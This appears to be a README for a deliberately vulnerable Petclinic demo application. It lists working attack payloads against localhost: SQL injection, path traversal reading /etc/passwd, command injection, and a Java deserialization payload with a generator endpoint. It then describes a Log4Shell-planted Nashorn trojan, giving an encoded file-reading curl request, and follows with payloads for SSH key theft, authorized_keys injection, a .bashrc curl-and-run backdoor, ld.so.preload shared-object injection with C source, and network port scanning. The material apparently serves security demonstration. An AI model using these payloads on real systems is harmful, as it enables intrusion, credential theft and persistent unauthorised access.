# Traditional Payloads
Each of these payloads first triggers a login to Petclinic and then performs the attack.
## SQL Injection
This is done using the following payload:
```
http://localhost:8080/customers?lastName=%27+or+1%3D1%3B--+
```
This is the equivalent of going to Find Customers page and adding the following to the last name field:
```
' or 1=1;--
```
This will return all customers in the database, by breaking out of the current SQL query and adding a new one that always returns true.

## Path Traversal
The Path Traversal is done using a  feature in the Petclinic application that allows you to upload a picture for a pet and view it.
### File Write
File Write:
```
http://localhost:8080/owners/1/pets/1/upload
```
Which takes a POST request containing a multi-part file upload. The filename field is not sanitized and the uploaded file is written to disk.
### File Read
The File Read is done using an endpoint to read the file from disk.
```
http://localhost:8080/owners/1/pets/getPhotoByPath?photoPath=../../../../../../../../../etc/passwd
```
## Command Injection
The Command injection makes a call to 
```
http:/localhost:8081/cmd?arg=cat%20%2Fetc%2Fpasswd%0A
```
This will execute the command `cat /etc/passwd` and return the results of that command
## Deserialization
The Deserialization attack is done by sending a serialized object to the endpoint
```
http://localhost:8081/deserialize?base64=rO0ABXNyADhvcmcuc3ByaW5nZnJhbWV3b3JrLnNhbXBsZXMuZW1haWxzZXJ2aWNlLm1vZGVsLkVtYWlsRGF0YdBEER%2Fgyw%2FWAgAETAAEYm9keXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACWNtZFJlc3VsdHEAfgABTAAMZW1haWxBZGRyZXNzcQB%2BAAFMAAdzdWJqZWN0cQB%2BAAF4cHQAD2NhdCAvZXRjL3Bhc3N3ZHB0ABB0ZXN0QGV4YW1wbGUuY29tdAAEdGVzdA%3D%3D
```
This calls cat `/etc/passwd`. 
If you want to generate a payload using a different command, you can use the following code:
```
http://localhost:8081/getPayload?cmd=cat%20%2Fetc%2Fpasswd
```
It will return a base64 encoded payload that that will execute the specified command


# Log4Shell In App Trojan
This is a trojan that can be injected into the Petclinic application using the Log4Shell vulnerability. It is a simple trojan that will execute any command that is passed to it. It is written in Nashorn script and is executed on the JVM.
The trojan when injected will look for incoming web requests to any endpoint that contain the request parameter cac= e.g
```
localhost:8081/someendpoint?cac=base64encodedpayload
```
When this is seen the base64 encoded payload is decoded and passed to the Nashorn Scripting Engine to be executed. So for example the following request.
```
curl 'http://localhost:8081/test?name=test&cac=dmFyIEZpbGVzID0gSmF2YS50eXBlKCJqYXZhLm5pby5maWxlLkZpbGVzIik7CnZhciBQYXRocyA9IEphdmEudHlwZSgiamF2YS5uaW8uZmlsZS5QYXRocyIpOwp2YXIgYnl0ZXMgPSBGaWxlcy5yZWFkQWxsQnl0ZXMoUGF0aHMuZ2V0KCIvZXRjL3Bhc3N3ZCIpKTsKCnZhciBjb250ZW50ID0gbmV3IGphdmEubGFuZy5TdHJpbmcoYnl0ZXMpOwoKY29udGVudDsK'
```
Contains the payload
```
var Files = Java.type("java.nio.file.Files");
var Paths = Java.type("java.nio.file.Paths");
var bytes = Files.readAllBytes(Paths.get("/etc/passwd"));
var content = new java.lang.String(bytes);
content;
```
Which reads the /etc/passwd file and returns it. The trojan takes the returned data, in this case the contents of the `/etc/passwd` file and saves it to the Spring Tomcat static file directory under `/tmp`
. This can then be read by making a follow on call to 
```
http://localhost:8081/faq.html
```


## Trojan Payloads
### Web UI
There is a file under the root of this project called `Payload.html` When opened in a browser it can be used to execute commands in the in app trojan. It simply encodes the data as base64 and sends it to localhost:8081 to be read by the Trojan. The results can be accessed under `http://localhost:8081/faq.html`

### Read /etc/passwd
As mentioned previously this just reads /etc/passwd and stores the result under /faq.html

### SSH Manipulation
The following set of commands lists the contents of the .ssh directory, exfiltrates a private SSH Key and inject a malicious key into the authorized_keys file to allow an attacker to login to the server
#### List .ssh directory
This command lists the files under the .ssh directory
#### Exfiltrate ssh private key
This command reads the contents of the ssh private key named id_ed25519 from the .ssh dir and makes it available under /faq.html
#### Exfiltrate authorized_keys file
This command reads the contents of the authorized_keys file from the .ssh dir and makes it available under /faq.html
#### Modify authorized_keys file
This command injects a malicious public key into the authorized_keys file to allow an attacker to login to the server
### Exfiltrate Application Jar
This command exfiltrates the application jar file and makes it available under /faq.jpeg
### Exfiltrate Application Properties
This command exfiltrates the application properties file and makes it available under /faq.html
### Exfiltrate Headdump
This command generates a heapdump of the application's memory and makes it available under /dump.hprof
### Modify .bashrc File
This command injects a malicious command into the .bashrc file to be executed whenever a user logs in. The malicous command calls curl to download a script from the internet and executes it, the downloaded script modified the authorized_keys file to inject a public key that would allow an attacker to access the server via SSH.
### Shared Object Injection
The following two commands first downloads a shared object file from another server. Then modifies `/etc/ld.so.preload` file to load the shared object file the next time any command on the OS is called.
#### Download Shared Object
Downloads the shared object file
#### Modify ld.so.preload
Modifes the preload file to load the shared object file
The shared object contains the folllowing code.
```cpp
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unlink("/etc/ld.so.preload");
    printf("HACK HACK HAK");
    system("/bin/bash -c \"echo 'I executed a arbitrary command as root to generate this text'>/tmp/command.out\"");
}
```

### Port Scanner
The Port Scanner command scans the ports on the server and other servers on the same network and once complete ( this takes several minutes) it makes the results available under /faq.html
By default the IP Range is :
"172.20.0.1" to "172.20.0.30";
Ports 22, 80, 443,8080,8081;
